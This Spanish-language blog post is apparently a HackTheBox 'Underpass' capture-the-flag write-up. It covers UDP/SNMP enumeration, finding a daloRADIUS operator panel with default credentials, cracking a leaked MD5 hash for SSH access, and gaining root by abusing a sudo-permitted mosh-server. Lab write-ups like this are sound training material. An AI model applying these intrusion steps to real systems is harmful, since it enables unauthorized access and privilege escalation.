---
layout: post
title:  "Writeup Underpass"
date:   2025-05-10 
categories: [Writeup, HackTheBox]
tags: [Linux]
image: /images/Writeup-underpass/Pasted image 20250503204027.png
---

***Dificultad: Facil***

***Sistema Operativo: Linux***

hola! hoy estamos aquí de nuevo con otro writeup de una maquina recien salida del horno!

esta es una maquina en la cual vamos a tocar lo que muchas veces pasamos por alto, *Protocolo UDP* para encontrar un snmp, usaremos herramientas para escanear el servidor a través de este protocolo, descubriendo una aplicación web y enumerándola aunque no podamos acceder a ella, lo que nos hará descubrir un panel de monitoreo con credenciales almacenadas, la que atacaremos para poder conectarnos a la maquina como el usuario **svcMosh**.
Para elevar nuestros privilegios en el servidor, veremos que podemos ejecutar como root un servicio llamado *mosh-server*

## Reconocimiento:

comenzamos creando los directorios de trabajo para la maquina:
```bash
mkdir nmap content exploits && cd nmap
```

ahora, lanzaremos el primer escaneo ip  de la maquina:
```bash
nmap -p- --open -Pn -sS -vvv -n --min-rate 5000 10.10.10.10 -oN puertos
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 20:59 CEST
Initiating SYN Stealth Scan at 20:59
Scanning 10.129.3.120 [65535 ports]
Discovered open port 22/tcp on 10.129.3.120
Discovered open port 80/tcp on 10.129.3.120
Completed SYN Stealth Scan at 20:59, 13.80s elapsed (65535 total ports)
Nmap scan report for 10.129.3.120
Host is up, received user-set (0.038s latency).
Scanned at 2025-05-03 20:59:33 CEST for 13s
Not shown: 62280 closed tcp ports (reset), 3253 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.89 seconds
           Raw packets sent: 78210 (3.441MB) | Rcvd: 64828 (2.593MB)
```
tenemos 2 puertos abiertos.

voy a capturar mas información de estos puertos con nmap:
```bash
nmap -p22,80 -sCV -n -vvv 10.129.3.120 -oN objetivos
```
```
Scanned at 2025-05-03 21:02:27 CEST for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

no tenemos un redireccionamiento, asi que despues de mirar un poco vulnerabilidades en la version de apache, ademas de intentar fuzzear, decido escanear los puertos UDP (poco se hace):

```bash
nmap -p- --open -sU -Pn -vvv -n --min-rate 5000  10.129.3.120 -oN puertosUDP
```
aunque esto nos reporta mucha, mucha basura, podemos ver los que nos han respondido con el ttl:

<img src="/images/Writeup-underpass/Pasted image 20250503220727.png" alt="image">

oh, el protocolo olvidado, **SNMP** 

*este protocolo se creo para el monitoreo de dispositivos de red y se utiliza también para manejar tareas de configuración de forma remota, (Puertos 161-162) *

lo primero que necesitamos es algo llamado "nombre de cadena de comunidad"

para poder escanear la red snmp voy a usar la herramienta **onesixtyone**:
```bash
onsixtyone 10.10.10.10 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
```
como resultado:
```
Scanning 1 hosts, 120 communities
10.129.4.44 [public] Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
```
en nombre de la cadena es *public* (nombre por defecto)

algo que he aprendido en otro pentesting anterior a este protocolo, debemos tener una librería que ayudara al resultado de la herramienta **snmpwalk**:
```bash
apt install snmp-mibs-downloader
```

luego iremos al archivo */etc/snmp/snmp.conf* y  en la linea *mibs :* la comentaremos:

<img src="/images/Writeup-underpass/Pasted image 20250504074036.png" alt="image">

finalmente usaremos snmpwalk:
```bash
snmpwalk -v1 -c public 10.10.10.10
```
resultado:
```
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (231812) 0:38:38.12
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (233039) 0:38:50.39
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2025-5-4,5:45:47.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 213
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
End of MIB
```

aunque es la versión 2 de snmp indicando *-v1* nos da resultados favorables, pero igual puedes intentar indicar el parámetro de la versión 2 (*-v2c*)

tenemos 2 cosillas interesantes aquí:
```
nombre de usuario: steve
nombre de dominio: UnDerPass.htb
```

ya tengo un nombre de dominio!
voy a agregarlo al /etc/hosts:
```bash
10.10.10.10      UnDerPass.htb
```


 ## Enumeracion:

nada cambia y vuelvo a lo descubierto por snmpwalk y depues de hacer algo de fuzzing y veo: *UnDerPass.htb is the only daloradius server in the basin!*

que es daloradius?

**daloRADIUS** is an advanced RADIUS web management application for managing hotspots and general-purpose

es una app web!

<img src="/images/Writeup-underpass/Pasted image 20250504084849.png" alt="image">

finalmente veo algo, desde aquí puedo intentar hacer fuzzing y mirar recursos o directorios:
```bash
wfuzz -c --hc=404 -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -u http://UnDerPass.htb/daloradius/FUZZ
```

y tambien con feroxbuster:
```
feroxbuster -u http://underpass.htb/daloradius/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt  -n

```

tenemos:
```
http://underpass.htb/daloradius/doc/
http://underpass.htb/daloradius/app/
http://underpass.htb/daloradius/contrib/
http://underpass.htb/daloradius/ChangeLog
http://underpass.htb/daloradius/setup/
http://underpass.htb/daloradius/library/
http://underpass.htb/daloradius/LICENSE
http://underpass.htb/daloradius/FAQS

```

despues de pulir un poco el comando de feroxbuster para una mejor busqueda:
```bash
feroxbuster -s 200 -u http://underpass.htb/daloradius/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php
```
y finalmente tenemos:
```
200   GET    15l    70w  5742c http://underpass.htb/daloradius/app/users/static/images/favicon/favicon-32x32.png
200   GET    19l   120w 10373c http://underpass.htb/daloradius/app/users/static/images/daloradius_small.png
200   GET     7l    21w  1707c http://underpass.htb/daloradius/app/users/static/images/favicon/favicon-16x16.png
200   GET     7l  1222w 80420c http://underpass.htb/daloradius/app/users/static/js/bootstrap.bundle.min.js
200   GET     5l    21w 85875c http://underpass.htb/daloradius/app/users/static/css/icons/bootstrap-icons.min.css
200   GET   412l  3898w 24703c http://underpass.htb/daloradius/ChangeLog
200   GET   112l   352w  4421c http://underpass.htb/daloradius/app/users/login.php
200   GET     0l     0w     0c http://underpass.htb/daloradius/app/users/lang/main.php
200   GET   340l  2968w 18011c http://underpass.htb/daloradius/LICENSE
200   GET   247l  1010w  7814c http://underpass.htb/daloradius/doc/install/INSTALL
```

lo mas interesante encontrado fue un panel de inicio de sesion del daloradius:
<img src="/images/Writeup-underpass/Pasted image 20250504091456.png" alt="image">

pero me pedia contrasena, supuse que eran las que tiene daloradius por defecto asi que intente varias mas, hice un poco de fuzing y no tenia resultados, asi que fui al github del proyecto y busque por "login.php" a ver si había algo y:
<img src="/images/Writeup-underpass/Pasted image 20250504095953.png" alt="image">

esa ruta no es igual a la del panel... existen 2 paneles de inicio de sesion? esta dice /operators/ y yo tengo /users/, exite otro panel?

si! hay otro panel:
<img src="/images/Writeup-underpass/Pasted image 20250504100303.png" alt="image">
 y al probar en este las credenciales por defecto: **administrator:radius**

## ssh como svcMosh:

<img src="/images/Writeup-underpass/Pasted image 20250504100414.png" alt="image">

mirando users listing, existe un solo usuario:
<img src="/images/Writeup-underpass/Pasted image 20250504100524.png" alt="image">

me da un hash de contraseña:
```bash
svcMosh:412DD4759978ACFCC81DEAB01B382403
```

tiene toda la pinta de un hash md5 asi que sera lo primero que intentare con hashcat
```hashcat
hashcat  hash /usr/share/wordlists/rockyou.txt -m 0
```

además de que en la pagina muestra que si es un hash md5:

<img src="/images/Writeup-underpass/Pasted image 20250504102243.png" alt="image">

como resultado:
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344390
* Bytes.....: 139921519
* Keyspace..: 14344390

412dd4759978acfcc81deab01b382403:underwaterfriends        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 412dd4759978acfcc81deab01b382403
Time.Started.....: Sun May  4 10:09:44 2025 (2 secs)
Time.Estimated...: Sun May  4 10:09:46 2025 (0 secs)

```
*underwaterfriends*

luego de probarlo en el /user/login.php (para descartar)

me intento conectar por ssh:
```bash
ssh svcMosh@10.10.10.10
```
<img src="/images/Writeup-underpass/Pasted image 20250504102842.png" alt="image">

***Primera flag*** 


## Escalando Privilegios:

ahora, para la escalada de privilegios, al enumerar el sistema, veo que podemos usar como root sin contrasena un binario llamado mosh-server

***(Mobile Shell), una alternativa a SSH diseñada para conexiones inestables, como redes móviles o Wi-Fi con alta latencia. A diferencia de SSH, Mosh usa UDP para mantener sesiones persistentes

dado que el binario lo ejecutamos como root, solo debemos ejecutar una shell y conectarnos a ella

primero iniciamos un servidor o nos podemos en escucha;
```bash
sudo /usr/bin/mosh-server new -p 60000
```

nos dará una especie de key en base64 la cual tomaremos rápidamente para iniciar sesión antes de que se cierre el puerto y la ejecutaremos con:
```bash
MOSH_key=4NeC...vZFe mosh-client 127.0.0.1 60000
```

y se conectara al puerto:

<img src="/images/Writeup-underpass/Pasted image 20250504110218.png" alt="image">

***Flag del sistema***

aquí puedes ir por la flag de root o por la id_rsa y tener una shell mas estable


-------------------------


nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">